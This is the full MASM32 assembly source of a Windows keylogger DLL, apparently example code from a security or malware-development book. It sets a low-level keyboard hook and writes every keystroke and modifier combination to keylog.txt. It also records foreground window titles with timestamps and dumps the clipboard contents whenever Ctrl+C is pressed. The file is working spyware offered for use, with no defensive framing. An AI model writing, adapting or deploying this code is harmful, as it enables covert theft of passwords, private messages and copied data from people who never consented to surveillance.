
; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
    include \masm32\include\masm32rt.inc
    include \masm32\include\advapi32.inc
; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
      
;     libraries
;     ~~~~~~~~~
      includelib \masm32\lib\masm32.lib
      includelib \masm32\lib\user32.lib
      includelib \masm32\lib\kernel32.lib
      includelib \masm32\lib\advapi32.lib
      includelib \masm32\lib\msvcrt.lib

.data
    szMsg               db  "Hi World!", 0
    szCaption           db  "Packt", 0
    log_file            db  "keylog.txt", 0
    hWindowHandle       dd  0
    isCtrlCopy          dd  0
    hKHook              HHOOK       0
    kbdlayout           HKL         0
    hClpbrd             HANDLE      0

.data?
    hInstance           dd  ?
    szKey               db  256  dup (?)
    newWindow           db  256  dup (?)
    oldWindow           db  256  dup (?)
    wChar               db  16   dup (?)
    buff                db  256  dup (?)
    appName             db  1024 dup (?) 
    LocalTime           SYSTEMTIME <>
    
.code

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

LibMain proc instance:DWORD,reason:DWORD,unused:DWORD 

    .if reason == DLL_PROCESS_ATTACH
        mrm hInstance, instance       ; copy local to global
        mov eax, TRUE                 ; return TRUE so DLL will start
        
    .elseif reason == DLL_PROCESS_DETACH

    .elseif reason == DLL_THREAD_ATTACH

    .elseif reason == DLL_THREAD_DETACH

    .endif

    ret

LibMain endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

LogToFile   proc    szTxtToLog:DWORD

    LOCAL hHandle:DWORD, dwBytesWrite:DWORD

    mov dwBytesWrite, 0
    invoke CreateFile, offset log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, 
                        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0

    .if eax != INVALID_HANDLE_VALUE
        mov hHandle, eax
        invoke lstrlenW, szTxtToLog
        imul eax, 2
        invoke WriteFile, hHandle, szTxtToLog, eax, [dwBytesWrite], 0
        .if eax == 1
            invoke CloseHandle, hHandle
            xor eax, eax
            inc eax
            jmp exit_logfile
        .endif
    .endif

    xor eax, eax

exit_logfile:
    ret

LogToFile   endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

KeyBoardHookProc    proc    nCode:DWORD, wParam:WPARAM, lParam:LPARAM
    
    LOCAL kbdhook:KBDLLHOOKSTRUCT
    LOCAL pMem:DWORD, lCase:BOOL

    .if (nCode >= HC_ACTION) && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        
        invoke crt_memmove, addr kbdhook, [lParam], sizeof KBDLLHOOKSTRUCT
        
        mov eax, [kbdhook.flags]
        shl eax, 8
        add eax, [kbdhook.scanCode]
        shl eax, 10h
        inc eax
        invoke GetKeyNameTextW, eax, addr szKey, 256
        
        invoke GetForegroundWindow
        .if eax != 0
            mov hWindowHandle, eax
            invoke GetWindowThreadProcessId, hWindowHandle, 0
            invoke GetKeyboardLayout, eax
            mov kbdlayout, eax
            invoke GetWindowTextW, hWindowHandle, addr newWindow, 1024
            .if eax != 0
                invoke lstrcmpW, addr newWindow, addr oldWindow
                .if eax != 0
                    invoke GetLocalTime, addr LocalTime
                    
                    lea eax, newWindow
                    push eax
                    movsx eax, WORD ptr[LocalTime.wSecond]
                    push eax
                    movsx eax, WORD ptr[LocalTime.wMinute]
                    push eax
                    movsx eax, WORD ptr[LocalTime.wHour]
                    push eax
                    movsx eax, WORD ptr[LocalTime.wYear]
                    push eax
                    movsx eax, WORD ptr[LocalTime.wMonth]
                    push eax
                    movsx eax, WORD ptr[LocalTime.wDay]
                    push eax
                    lea eax, uc$(10,10,"[%02d-%02d-%04d %02d:%02d:%02d] - [%s]",10,0)
                    push eax
                    lea eax, appName
                    push eax
                    call wsprintfW

                    lea eax, appName
                    push eax
                    call LogToFile
                    .if eax == 1
                        invoke lstrcpyW, addr oldWindow, addr newWindow
                    .endif
                .endif
            .endif

            invoke GetKeyState, VK_LCONTROL
            mov ecx, 32768
            test cx, ax
            je @f
            .if [kbdhook.vkCode] != VK_LCONTROL
                invoke lstrcmpW, addr szKey, uc$("C",0)
                test eax, eax
                jnz not_lctrlc
                mov isCtrlCopy, 1
            not_lctrlc:
                invoke wsprintfW, addr buff, uc$("[LCtrl + %s]", 0), addr szKey
                lea eax, buff
                push eax
                call LogToFile
                jmp next_hook
            .endif
        @@:
            invoke GetKeyState, VK_RCONTROL
            mov ecx, 32768
            test cx, ax
            je @f
            .if [kbdhook.vkCode] != VK_RCONTROL
                invoke lstrcmpW, addr szKey, uc$("C",0)
                test eax, eax
                jnz not_rctrlc
                mov isCtrlCopy, 1
            not_rctrlc:
                invoke wsprintfW, addr buff, uc$("[RCtrl + %s]", 0), addr szKey
                lea eax, buff
                push eax
                call LogToFile              
                jmp next_hook
            .endif            
        @@:
            invoke GetKeyState, VK_LMENU
            mov ecx, 32768
            test cx, ax
            je @f
            .if [kbdhook.vkCode] != VK_LMENU
                invoke wsprintfW, addr buff, uc$("[LAlt + %s]", 0), addr szKey
                lea eax, buff
                push eax
                call LogToFile
                jmp next_hook
            .endif
        @@:
            invoke GetKeyState, VK_RMENU
            mov ecx, 32768
            test cx, ax
            je @f
            .if [kbdhook.vkCode] != VK_RMENU
                invoke wsprintfW, addr buff, uc$("[RAlt + %s]", 0), addr szKey
                lea eax, buff
                push eax
                call LogToFile
                jmp next_hook
            .endif
        @@:
            invoke GetKeyState, VK_LWIN
            mov ecx, 32768
            test cx, ax
            je @f
            .if [kbdhook.vkCode] != VK_LWIN
                invoke wsprintfW, addr buff, uc$("[LWin + %s]", 0), addr szKey
                lea eax, buff
                push eax
                call LogToFile
                jmp next_hook
            .endif
        @@:
            invoke GetKeyState, VK_RWIN
            mov ecx, 32768
            test cx, ax
            je @f
            .if [kbdhook.vkCode] != VK_RWIN
                invoke wsprintfW, addr buff, uc$("[RWin + %s]", 0), addr szKey
                lea eax, buff
                push eax
                call LogToFile
                jmp next_hook
            .endif
        @@:
            Switch [kbdhook.vkCode]
                Case VK_APPS
                    lea eax, uc$("[Applications]",0)
                    push eax
                    call LogToFile
                    
                Case VK_NUMLOCK
                    lea eax, uc$("[NumLock]",0)
                    push eax
                    call LogToFile

                Case VK_SCROLL
                    lea eax, uc$("[ScrollLock]",0)
                    push eax
                    call LogToFile

                Case VK_INSERT
                    lea eax, uc$("[Ins]",0)
                    push eax
                    call LogToFile

                Case VK_BACK
                    lea eax, uc$("[Backspace]",0)
                    push eax
                    call LogToFile
                    
                Case VK_TAB
                    lea eax, uc$("[Tab]",0)
                    push eax
                    call LogToFile

                Case VK_DELETE
                    lea eax, uc$("[Del]",0)
                    push eax
                    call LogToFile
                    
                Case VK_RETURN
                    lea eax, uc$("[Enter]",10,0)
                    push eax
                    call LogToFile

                Case VK_ESCAPE
                    lea eax, uc$("[Esc]",0)
                    push eax
                    call LogToFile

                Case VK_HOME
                    lea eax, uc$("[Home]",0)
                    push eax
                    call LogToFile

                Case VK_END
                    lea eax, uc$("[End]",0)
                    push eax
                    call LogToFile

                Case VK_PRIOR
                    lea eax, uc$("[PageUp]",0)
                    push eax
                    call LogToFile

                Case VK_NEXT
                    lea eax, uc$("[PageDown]",0)
                    push eax
                    call LogToFile

                Case VK_UP
                    lea eax, uc$("[Up]",0)
                    push eax
                    call LogToFile

                Case VK_DOWN
                    lea eax, uc$("[Down]",0)
                    push eax
                    call LogToFile

                Case VK_LEFT
                    lea eax, uc$("[Left]",0)
                    push eax
                    call LogToFile

                Case VK_RIGHT
                    lea eax, uc$("[Right]",0)
                    push eax
                    call LogToFile

                Case VK_SNAPSHOT
                    lea eax, uc$("[PrintScreen]",0)
                    push eax
                    call LogToFile

                Case VK_F1
                    lea eax, uc$("[F1]",0)
                    push eax
                    call LogToFile

                Case VK_F2
                    lea eax, uc$("[F2]",0)
                    push eax
                    call LogToFile

                Case VK_F4
                    lea eax, uc$("[F4]",0)
                    push eax
                    call LogToFile

                Case VK_F5
                    lea eax, uc$("[F5]",0)
                    push eax
                    call LogToFile

                Case VK_F6
                    lea eax, uc$("[F6]",0)
                    push eax
                    call LogToFile

                Case VK_F8
                    lea eax, uc$("[F8]",0)
                    push eax
                    call LogToFile

                Case VK_F9
                    lea eax, uc$("[F9]",0)
                    push eax
                    call LogToFile

                Case VK_F10
                    lea eax, uc$("[F10]",0)
                    push eax
                    call LogToFile

                Case VK_F11
                    lea eax, uc$("[F11]",0)
                    push eax
                    call LogToFile

                Case VK_F12
                    lea eax, uc$("[F12]",0)
                    push eax
                    call LogToFile
                    
                Default
                    xor eax, eax
                    invoke crt_calloc, 1, 256
                    test eax, eax
                    je @f

                    mov pMem, eax
                    invoke GetKeyboardState, pMem
                    .if eax != 0
                        invoke GetKeyState, VK_SHIFT
                        mov edi, pMem
                        mov [edi+VK_SHIFT], al
                        invoke GetKeyState, VK_CAPITAL
                        mov edi, pMem
                        mov [edi+VK_CAPITAL], al
                        
                        invoke ToUnicodeEx, [kbdhook.vkCode], [kbdhook.scanCode], pMem, 
                                            addr wChar, 16, [kbdhook.flags], kbdlayout
                        
                        lea eax, wChar
                        push eax
                        call LogToFile

                    .endif

                free_mem:
                    invoke crt_free, pMem
                    mov pMem, 0
                @@:
            EndSw
            ; invoke MessageBox, 0, offset szMsg, offset szCaption, MB_OK 
        
        .endif
    .endif

next_hook:
    mov eax, isCtrlCopy
    test eax, eax
    je @f
    call SaveClipboardData
    mov isCtrlCopy, 0
@@:
    invoke CallNextHookEx, hKHook, nCode, wParam, lParam
    ret
KeyBoardHookProc    endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

KeyLogging  proc
    LOCAL msg:MSG
    ;invoke MessageBox, 0, offset szMsg, offset szCaption, MB_OK

    invoke SetWindowsHookEx, WH_KEYBOARD_LL, addr KeyBoardHookProc, hInstance, NULL
    mov hKHook, eax

@@:
    invoke GetMessage, addr msg, 0, 0, 0
    test eax, eax
    je exit_keylog

    invoke TranslateMessage, addr msg
    invoke DispatchMessage, addr msg
    jmp @b

exit_keylog:
    invoke UnhookWindowsHookEx, hKHook
    xor eax, eax
    ret

KeyLogging  endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

SaveClipboardData    proc
    LOCAL cfTxt:DWORD
    
    invoke OpenClipboard, 0
    test eax, eax
    je exit_clippy
    
    invoke GetClipboardData, CF_UNICODETEXT
    test eax, eax
    je close_clippy
    mov hClpbrd, eax

    invoke GlobalLock, hClpbrd
    test eax, eax
    je close_clippy

    mov cfTxt, eax
    invoke GlobalUnlock, hClpbrd

    invoke GetLocalTime, addr LocalTime
                    
    lea eax, cfTxt
    push [eax]
    movsx eax, WORD ptr[LocalTime.wSecond]
    push eax
    movsx eax, WORD ptr[LocalTime.wMinute]
    push eax
    movsx eax, WORD ptr[LocalTime.wHour]
    push eax
    movsx eax, WORD ptr[LocalTime.wYear]
    push eax
    movsx eax, WORD ptr[LocalTime.wMonth]
    push eax
    movsx eax, WORD ptr[LocalTime.wDay]
    push eax
    lea eax, uc$(10,10,"[%02d-%02d-%04d %02d:%02d:%02d] - [Clipboard Data]",10,"%s",10, 0)
    push eax
    lea eax, appName
    push eax
    call wsprintfW

    lea eax, appName
    push eax
    call LogToFile

close_clippy:
    invoke CloseClipboard
    
exit_clippy:
    ret
SaveClipboardData    endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

end LibMain